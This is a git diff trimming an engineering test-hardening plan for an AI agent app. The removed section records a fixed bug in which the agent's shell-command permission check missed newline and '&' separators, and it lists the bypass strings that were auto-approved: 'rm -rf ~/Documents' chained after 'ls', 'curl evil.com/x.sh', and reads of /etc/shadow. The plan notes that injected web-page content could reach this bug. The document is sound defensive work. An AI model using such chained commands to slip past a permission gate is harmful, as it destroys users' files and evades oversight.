@@ -1,182 +1,20 @@
 # Test hardening plan
 
-**Status: PARTIALLY ADOPTED. Measurement taken 2026-07-20; last reconciled against the
-tree 2026-07-26.**
+**Status: PARTIALLY ADOPTED.** Originated from a whole-repo mutation measurement on
+2026-07-20; last reconciled against the tree 2026-07-26.
 
-Measured mutation testing of the whole repo against the standard the snapshot subsystem was
-held to, a prioritised plan to close the gap, and one live bug the measurement found.
+The standard the snapshot subsystem was held to, generalised — plus the open work still
+needed to reach it.
 
-**What has since landed** (PR **#48** and PR **#49**, both merged; see HANDOFF.md
-"What shipped 07-24 — the security + test-hardening wave"): **H1** (the live
-`run_command` bug, closed by removing the classifier rather than hardening it),
-**H2** (the `keychain.rs` builder split + the private-seed sweep), **H3** (the SAFE/OPEN
-boundary enforced at dispatch, `tests/test_dev_only_boundary.py`), **H5** (the repo-wide
-G2 test, `tests/test_g2_no_self_trigger.py`), **H6** (both `rpc/widgets` enforcement call
-sites), **H8** (`shell_bridge` error frames, timeouts, key fetch,
-`tests/test_shell_bridge.py`), and part of **H4** and **H12**. Every item below carries its
-own current status.
+**Trimmed 2026-07-26.** The original 2026-07-20 measurement tables, the live-bug
+write-up (H1) and the cost estimates were removed: the bug is fixed, the numbers were a
+record of a moment rather than a claim about the current suite, and several modules they
+scored have since been rewritten. All of it is in git. **Re-measure before quoting any
+figure.**
 
-**Still entirely open:** **H9** (the `PermissionCard` consent-surface defects — all three
-are still in `PermissionCard.tsx` today), **H10**, **H11**, **H13**, **H14**.
-
-**The numbers in §0 are the 2026-07-20 measurement and are not refreshed here.** They are
-a record of a moment, not a claim about the current suite; several of the modules scored
-below have been rewritten since. Re-measure before quoting any of them.
-
----
-
-## 0. The measurement
-
-**The suite kills 76% of Python mutations and 30% of Rust mutations. The snapshot subsystem
-killed 39 of 39.** The rest of the repo is 24 points below its own bar in Python and 70 points
-below it in Rust — and the shortfall is concentrated in exactly the machinery whose job is
-safety: the permission classifier, the shell bridge that carries API keys, the keychain module,
-and the enforcement points where the validators are actually called.
-
-That framing is the argument for this document, and it should not be softened. It is also not
-the worst of it. The measurement turned up **one live, reproducible defect**: in OPEN mode a
-single shell command can delete a user's files with **zero permission cards**, because the
-read-only allowlist does not treat a newline as a command separator. That is the destructive-prompt
-rule — a documented safety property — failing silently on today's build.
-
-| Tier | Mutations | Killed | Rate |
-|---|---|---|---|
-| **Snapshot subsystem** (prior rounds, three passes) | 39 | 39 | **100%** |
-| **Python — rest of repo** | 80 | 61 | **76%** |
-| **Rust shell** | 23 | 7 | **30%** |
-| Combined sampled (ex-snapshots) | 103 | 68 | **66%** |
-
-Baseline, re-verified for this document: `pytest tests/ -q` → **658 passed, 1 xfailed, 8.17s**.
-Rust: **31 `#[test]`** across 4 of 7 files. Frontend: **72 vitest tests**, 8 files, against
-**21 components** and **7 hooks**.
-
-### Per-module kill rate (Python)
-
-| Module | Rate | Note |
-|---|---|---|
-| `shell_bridge.py` | **0/3** | every error path unpinned; carries provider keys (G1) |
-| `rpc/widgets.py` | **0/2** | SAFE invariant 4's enforcement point |
-| `models_catalog.py` | **0/1** | |
-| `providers/` retry · anthropic | 1/2 · 1/2 | |
-| `providers/router.py` | 3/5 | |
-| `tools/web_search.py` | 2/3 | |
-| `tools/base.py` · `undo_manager.py` | 3/4 · 3/4 | |
-| `tools/registry.py` · `tools/run_command.py` | 4/5 · 4/5 | see §1 — the survivor here is the live bug |
-| `orchestrator.py` | 6/8 | |
-| `permissions/gate.py` · `widgets.py` | 6/7 · 6/7 | |
-| `routines/` · `memory/store.py` · `profiles` · `skills` · `policy` · `rpc/conversation` · `rpc/providers` | **21/21** | |
-
-### Per-file kill rate (Rust)
-
-| File | Tests | Mutations | Killed |
-|---|---|---|---|
-| `keychain.rs` | 20 | 10 | **3** |
-| `filesystem.rs` | 4 | 7 | **1** |
-| `ipc.rs` | 6 | 3 | 2 |
-| `app_build.rs` | 1 | 1 | 1 |
-| `agent_process.rs` | **0** | 2 | **0** |
-| `main.rs` / `updater.rs` | 0 | — | (correctly untested: wiring and an unwired stub) |
-
-**The shape of the gap, in one sentence: the pure logic modules are excellent and the boundaries
-are unpinned.** `widgets.py` scores 86% while `rpc/widgets.py` — the two places production
-actually calls the validator — scores 0%. `keychain.rs` has 20 tests and kills 3 of 10 mutations,
-because the tests exercise everything *around* the OS-keychain seam and nothing across it. The
-gate is tested directly and thoroughly; the orchestrator's use of it in OPEN mode is never
-exercised at all.
-
-### Method integrity
-
-This matters more than the number, because round one of the snapshot subsystem passed eight gates
-while broken. Every anchor was asserted to match exactly once (0 anchor errors in 83 attempts).
-`__pycache__` was purged per run with `PYTHONDONTWRITEBYTECODE=1`. A deliberate **control mutant**
-— a semantically inert line in `calculator.py` — **survived**, confirming the harness reports
-honestly rather than killing everything.
-
-Three mutants were **excluded from the denominator** rather than banked as survivors: one control,
-and two `gate` mutants whose anchor matched a `def` line so the replacement landed in a docstring
-and left the real body intact. Re-run correctly, **both were killed**. A second reviewer hit the
-same trap independently and corrected it the same way. Scoring an equivalent mutant as a survivor
-manufactures a fake hole, which is the same class of error as a test that cannot fail — so it is
-flagged here rather than quietly improving the number.
-
-**What the number does not cover.** These are mutations *we chose*. 76% is a lower bound on the
-modules sampled and says nothing about `main.py` (1747 lines), `read_web_page.py` (850, sampled
-only with a control), or the TypeScript tree. The snapshot subsystem was **not** re-mutated here —
-its 100% is inherited from the prior rounds, not re-verified.
-
-### Where the four assessments disagreed, and the resolution
-
-1. **Is the OPEN destructive path broken, or merely untested?** Both, in different places, and
-   they are not in conflict. The orchestrator's *wiring* is correct — it calls
-   `call_is_destructive` and passes `detail` through, verified by probe. The *classifier it asks*
-   returns the wrong answer for chained commands. So: the orchestrator has a missing test, the
-   classifier has a live bug. Fixing either alone leaves the hole open.
-2. **Does the permission card receive `detail`?** On the OPEN destructive path, yes —
-   `_request_per_invocation` calls `self._on_request(tool_id, detail)`. On the SAFE path, no —
-   `request()` calls `self._on_request(tool_id)` and the computed `detail` is discarded. Both
-   readings were right about different code paths. Confirmed in `permissions/gate.py`.
-3. **Rust kill rate: 30%, not 32%.** 23 mutations, 7 killed. Arithmetic corrected.
-4. **Frontend component count: 21 components, 7 hooks, exactly 3 components and 2 hooks with any
-   test.** Counted directly rather than reconciling two estimates.
-
----
-
-## 1. The live bug, verified
-
-> **RESOLVED 2026-07-20 — owner decision: every `run_command` call now cards.**
-> The fix below was drafted as an argument-allowlist (unknown flag → destructive).
-> A round of hardening then showed even that was defeatable (short-flag bundling
-> `grep -rf`, attached values `grep -f/path`, an allowlisted reader writing a file
-> `file -Cm`), which is the general lesson: statically deciding whether an
-> arbitrary shell command is read-only is a losing game, and the failure lands
-> **outside** the G3 rollback floor. So the auto-allow was removed, not patched:
-> `RunCommandTool.is_destructive` returns `True` unconditionally, every command
-> raises the per-invocation card showing its exact text, and the classifier and
-> its metacharacter/allowlist constants were deleted. `tests/test_run_command.py`
-> now pins that even a bare `ls` cards, with the three defeat vectors kept as named
-> regressions. The rest of this section records the bug as it was, for the ledger.
-
-Independently reproduced for this document
-(`scratchpad/hardening/verify/classifier_e2e.py`), running the real
-`call_is_destructive` → real `PermissionGate.authorize(mode=OPEN)` → real `RunCommandTool.execute`
-against a throwaway directory:
-
-```
-  before: ['taxes.pdf']
-  call_is_destructive     -> False
-  gate.authorize          -> GRANTED
-  permission cards shown  -> 0
-  tool executed, success=True
-  after: DIRECTORY GONE
-```
-
-`_METACHARACTERS` in `agent_core/tools/run_command.py` is `(";", "&&", "||", "|", ">", "<", "`", "$(")`.
-It omits **newline**, **carriage return**, and **bare `&`** — all three of which `sh -c` treats as
-command separators, and `execute` runs with `shell=True`. Classification then takes the first
-whitespace token, so `ls\nrm -rf ~/Documents` classifies on `ls`. Confirmed read-only, and
-therefore auto-granted:
-
-```
-READONLY(auto-grant)   'ls\nrm -rf ~/Documents'
-READONLY(auto-grant)   'ls\r\nrm -rf ~/Documents'
-READONLY(auto-grant)   'ls & rm -rf ~/Documents'
-READONLY(auto-grant)   'echo hi & curl evil.com/x.sh'
-READONLY(auto-grant)   'find . -delete'
-READONLY(auto-grant)   'find . -exec rm {} +'
-READONLY(auto-grant)   'wc --files0-from=/etc/shadow'
-READONLY(auto-grant)   'tail -f /etc/passwd'
-```
-
-**Why the suite did not catch it, and why this is the whole thesis of the document.**
-`tests/test_run_command.py` holds a 21-entry read-only table and a 15-entry destructive table.
-Every entry in the destructive table is a metacharacter the implementation already checks —
-`;`, `&&`, `||`, `|`, `>`, `<`, backtick, `$(`. The table is a **transcription of the
-implementation**, so it can only ever confirm that the code does what the code does. This is the
-round-one failure verbatim: *the tests encoded the same wrong assumptions they were meant to catch.*
-
-The blast radius is the user's home directory, which is **outside G3** — snapshots cover Addison's
-configuration, not the user's files. There is no way back. It is reachable by the model, and via
-`read_web_page` it is reachable by injected page content.
+**Closed:** H1, H2, H3, H5, H6, H8 (PRs #48/#49) and H7 (overtaken).
+**Open:** H9 (all three `PermissionCard.tsx` consent-surface defects are still live),
+H10, H11, H13, H14, and the remainder of H4 and H12.
 
 ---
 
@@ -347,35 +185,14 @@ write the rule before the capability, and it fails loudly the moment the capabil
 
 ## 4. The work plan, ordered by consequence
 
+**Closed items (H1, H2, H3, H5, H6, H8 — and H7, overtaken) were removed on
+2026-07-26; they shipped in #48/#49 and the detail is in git.** What remains
+below is open work only.
+
 Ordered by what a user experiences when it fails, not by module layout. Every item names the
 mutation it must kill; an item that cannot name its mutation is not specified yet.
 
 ### Tier 0 — a silent failure here means a user cannot get back to a working machine
-
-**H1. `run_command` destructive classification. — DONE 2026-07-20.** Shipped, not
-by hardening the classifier (see §1) but by removing it: every command cards. The
-classifier is gone, so there is no per-flag table to maintain and no separator
-corpus to keep exhaustive — the whole class of `rc-0x` survivors is closed at the
-root rather than one entry at a time. `tests/test_run_command.py` asserts the
-property (even `ls` cards) with the newline, bundled-flag and `file -Cm` vectors
-kept as named regressions, and the mutation `is_destructive → False` fails five
-tests across `test_run_command.py` and `test_policy_modes.py`. No open work.
-
-**H2. `keychain.rs` builder split + private-seed test. — DONE 2026-07-24 (#49).**
-`device_key_response()` / `sign_relay_response()` are extracted, the two hand-built-literal tests
-now call them, and a sweep serialises every keychain response and asserts the seed appears in
-none. Verified failing with the seed added. **Killed:** `K1`, `K10`. No open work.
-
-**H3. The SAFE/OPEN execution boundary. — DONE 2026-07-24 (#49).** Both dispatch sites now
-consult `registry.refuse_if_dev_only_outside_open()` **before the gate**, so nobody is asked to
-approve something that was never going to run. `tests/test_dev_only_boundary.py` drives a rogue
-HIGH dev-only tool through both paths in both modes — and asserts it **still runs in OPEN**,
-because breaking the harness would be worse than the hole. **Killed:** `ml-01`. The original
-analysis follows, because it is the reasoning step 7 will need again:
-`registry.is_dev_only()` had **zero callers in `agent_core/`**; both dispatch sites did a bare
-`registry.get(tool_id)`; and the boundary held only because `run_command.execute` remembered to
-check `context.policy_mode` itself — a convention a second dev-only tool would not inherit, with
-steps 5, 7 and 8 all adding dev-only surface.
 
 **H4. Registry undo enforcement — substance, not presence. — PARTIALLY DONE (#49).**
 *Ranks here because the spec calls this "the single most important test in the codebase".*
@@ -408,34 +225,7 @@ CLAUDE.md's "do NOT satisfy this with a no-op `undo()`" was prose with no enforc
 **Killed:** `reg-04` (non-callable undo accepted). **Open:** `reg-03` (no-op undo accepted),
 `reg-02` (Protocol-default `undo` satisfies the check).
 
-**H5. G2 repo-wide structural test. — DONE 2026-07-24 (#49).** Covered in §3/G2.
-**Killed:** `g2-01`.
-
 ### Tier 1 — a safety invariant switches off silently, or the consent surface lies
-
-**H6. Pin SAFE invariant 4 at its enforcement points. — DONE 2026-07-24 (#49).** Both
-`rpc/widgets` enforcement call sites are pinned, asserted against the widgets **table** rather
-than `widget.list` — the render filter hides the mutation's row, so the list looks identical
-either way and a `widget.list` assertion would have proved nothing. **Killed:** `rpc-02`,
-`rpc-03`. What it was: removing **both** the `confirmSave` re-validation and the `widget.list`
-render-time filter left the suite green while a
-`{"kind":"command","command":"rm -rf ~/Documents"}` widget **saved and rendered on the Simple
-profile's rail**.
-
-**H7. Orchestrator at `mode=OPEN`. — LARGELY OVERTAKEN; confirm before spending on it.**
-`run_turn` is now driven with `PolicyMode.OPEN` in `tests/test_dev_only_boundary.py` and
-`tests/test_workspace_trust.py`, and the two-argument `on_request(tool_id, detail)` production
-call is exercised by the step-2 destructive-card tests. **What has not been confirmed written**
-is the specific assertion this item asked for: an OPEN turn with a destructive `run_command`
-that asserts the card carries the **exact command text**. Check for it; write it if it is
-missing. **Kills:** `orc-05` (OPEN tool set offered in SAFE), `orc-06` (call never marked
-destructive).
-
-**H8. `shell_bridge.py` error paths. — DONE 2026-07-24 (#49).** `tests/test_shell_bridge.py`
-covers error frames, timeouts and `get_provider_key`, and its G1 retention test checks the
-instance, the **class** and the **module** namespace — the plausible mistake being to port the
-Rust shell's sanctioned session cache into the core as `type(self)._cache`. **Killed:** `sb-01`,
-`sb-02`, `sb-03`.
 
 **H9. `PermissionCard` — three verified defects on the consent surface. STILL ENTIRELY OPEN
 (re-verified against the tree 2026-07-26 — the `truncate` class, the `indexOf` split and the
@@ -587,29 +377,6 @@ review.
 
 ---
 
-## 6. Sequencing against Phase 2
-
-**Steps 2–5 have since shipped, so the first three rows below are history.** Steps **6, 7 and 8**
-are the only ones left, and the rule this section exists to state still holds: **testing a floor
-before the capability lands is worth several times more than after** — after, the test has to be
-retrofitted around code that already works, which is how you get a test that agrees with the
-implementation.
-
-| Land before | Because |
-|---|---|
-| ~~**H4** (undo substance), **H14** (open_link decision)~~ | ~~**Step 2 — Custom profile + guards.**~~ Step 2 shipped 2026-07-24 with H4 only half-closed and H14 untouched. The bet was taken; both are still open, and the debt is real rather than theoretical. |
-| ~~**G4 xfail** (§3)~~ | ~~**Step 2.**~~ Overtaken — `mint_anchor` got its caller (`guards.set`) with real tests, so the placeholder was never needed. |
-| ~~**H1, H3, H4, H11**~~ | ~~**Step 5 — harness + workspace-trust.**~~ Step 5 shipped with H1 and H3 closed first (#48, #49) — which is the argument working. **H11 was not**, and step 5 duly hammered `filesystem.rs`; that is why the dangling-symlink defeat of the data-dir floor was found by a post-build reviewer rather than by a test. |
-| **H6** (invariant 4 at its call sites) — **DONE** | **Step 6 — widget capability tiers.** Step 6 expands the safe vocabulary (to-do, note, timer). The tier boundary is now pinned at `confirmSave` and `list`, *before* the new kinds arrive, which is exactly the order this table asked for. |
-| **H10** (gate fault injection); **H8** (shell_bridge) — **H8 DONE** | **Step 7 — MCP client.** MCP admits **externally-authored tools** through the registry and gate. Every fault-injection case in H10 becomes reachable by a third party. A gate that fails open on a handler returning `None` is acceptable-ish with a handful of in-repo tools and unacceptable with an MCP server. **H10 is the one to land before step 7.** |
-| **H5** (G2 repo-wide) — **DONE** | **Step 8 — automation keyword gate.** Step 8 is where G2 stops being theoretical, and the structural test is already in place, so step 8 will be *built against* an enforced floor. |
-
-One caveat that has now come true: free/gray-area endpoints make untrusted-content screening
-load-bearing, and that is still explicitly v2. Step 4 shipped without pulling it forward — keep it
-that way, and keep the item visible.
-
----
-
 ## 7. How to keep it
 
 **Is mutation testing worth wiring into CI? Not as a blocking gate. Yes as a sampled nightly.**
@@ -657,53 +424,6 @@ for the same reason. What is still true is that the live-driver scripts it descr
 persist** — they are rewritten every session. Promote the live driver to a committed, marked test
 (§8) if that is worth two days; until then the runbook says plainly that the scripts are ephemeral,
 which is better than reading as current and not being.
-
----
-
-## 8. Cost, and what to do with a fraction of it
-
-Original estimate, with what has since been paid struck through:
-
-| Band | Items | Cost |
-|---|---|---|
-| ~~**Tier 0** (H1–H5)~~ | ~~classifier bug fix, keychain G1, dev-only boundary, G2~~ — **done**; H4's round-trip undo remains | **~1 day left** |
-| **Tier 1** (H6–H12) | ~~invariant-4 call sites~~, ~~shell_bridge~~, OPEN orchestrator (check first), PermissionCard, gate faults, FileState, the last two drift fixtures | **~3.5 days left** |
-| **Tier 2** (H13–H14) | undo/prune, rpc/undo honesty, routine consent, serialization property tests, router, open_link | **~2.5 days** |
-| **Keep-it** (§7) | catalogue, nightly sample, floors gate, review line — **none of it built** | **~1 day** |
-| | | **~8 days left of ~13.5** |
-
-Add ~2 days if the live-driver harness is promoted to a committed test with a stubbed model call
-for CI and a real one for the paid pass. That item is not in the ranking above because it is
-infrastructure rather than a floor, but it is the only thing that would give the **Core→Shell
-direction** — 14 of 56 protocol methods, with **no test reference of any kind**, and almost exactly
-the outbound set — its first automated exercise.
-
-### If only a fraction gets done
-
-The original ranking (H1 alone; then H1/H3/H5; then add H2/H4) has been **spent** — those items
-landed in #48 and #49, and the argument for them is recorded in their sections above. What
-follows replaces it.
-
-**If there is time for exactly one item: H9, the `PermissionCard`.** It is the only remaining item
-where a defect is *already on screen for the user*: the mono chip whose visual grammar means "this
-is the exact command" clips the command to one line and can be made to render ordinary prose, on
-the surface where the whole destructive-prompt rule is rendered to a human. Every command now
-raises a card (#48), so the card is on the critical path of every dev action rather than an
-occasional one.
-
-**If three: add H10 and H12's `permission.requestGrant` fixture.** All three point at the same
-seam. H9 is what the person reads, H12 is what stops the core rewording it out from under the
-component, and H10 is whether the answer they give is honoured when a handler misbehaves —
-which is exactly what step 7 hands to a third party.
-
-**If five: add H4's round-trip undo and H11.** H4 because the spec calls it the most important
-test in the codebase and it still proves only that an `undo` is *callable*, never that it works.
-H11 because step 5 already hammered `filesystem.rs` and the seam is still uncrossed — the
-dangling-symlink defeat of the data-dir floor was found by a reviewer, not by a test.
-
-**If the answer is "none of it right now": do the review-checklist line (free) and the committed
-mutation catalogue (§7.2).** Neither blocks anything, and the catalogue is what converts "we
-mutation-tested it once" into something a reviewer can re-run against a PR.
 
 ---
 
